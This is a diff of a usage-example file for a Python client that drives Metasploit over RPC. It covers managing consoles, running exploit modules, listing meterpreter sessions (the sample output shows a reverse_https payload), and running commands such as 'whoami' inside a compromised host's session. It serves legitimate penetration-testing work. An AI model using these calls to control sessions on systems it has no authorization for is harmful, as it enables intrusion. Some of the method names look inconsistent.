@@ -1,7 +1,6 @@
-import os
 from metasploit.msfrpc import *
 
-## Brief example script
+## Usage example
 
 # Connect to the RPC server
 client = MsfRpcClient('mypassword')
@@ -41,17 +40,20 @@ shell.stop()
 client.consoles.console().cid
 # >>> "1"
 
+# Destroy a console
+client.console.console('1').destroy
+
 # Write to console
-client.consoles.console('0').write('show options')
+client.consoles.console('1').write('show options')
 
 # Read from console
-client.consoles.console('0').read()
+client.consoles.console('1').read()
 # >>> {'data': 'Global Options:\n===============\n\n   Option...'
 #      'prompt': '\x01\x02msf5\x01\x02 \x01\x02> ',
 #      'busy': False}
 
 # Check if console is busy
-client.consoles.console('0').is_busy()
+client.consoles.console('1').is_busy()
 # >>> False
 
 
@@ -137,22 +139,9 @@ client.consoles.console(cid).execute_module_with_output(exploit, payload='cmd/un
 # Get all sessions
 client.sessions.list
 # >>> {'1': {'type': 'meterpreter',
-#   'tunnel_local': '192.168.1.2:4444',
-#   'tunnel_peer': '192.168.1.3:52688',
-#   'via_exploit': 'exploit/multi/script/web_delivery',
-#   'via_payload': 'payload/windows/x64/meterpreter/reverse_https',
-#   'desc': 'Meterpreter',
-#   'info': 'DESKTOP-UYTD0H\\person1 @ DESKTOP-UYTD0H',
-#   'workspace': 'default',
-#   'session_host': '192.168.1.2',
-#   'session_port': 52688,
-#   'target_host': '',
-#   'username': 'person1',
-#   'uuid': 'eaaaeufs',
-#   'exploit_uuid': '55dgrk6z',
-#   'routes': '',
-#   'arch': 'x64',
-#   'platform': 'windows'}}
+#      'tunnel_local': '192.168.1.2:4444',
+#	    [...]
+#      'platform': 'windows'}}
 
 # Get a session's info
 client.sessions.session('1').info
@@ -163,4 +152,11 @@ client.sessions.session('1').write('help\n')
 # Read a session
 client.sessions.session('1').read()
 # >>> '\nCore Commands\n=============\n\n    Command                   Description\n    ------- [...]'
+
+# Run a command and wait for the output
+client.sessions.session('1').run_with_output('arp')
+# >>> '\nArp stuff'
+
+# Run a shell command within a meterpreter session
+client.sessions.sessions('1').run_shell_cmd_with_output('whoami')
 
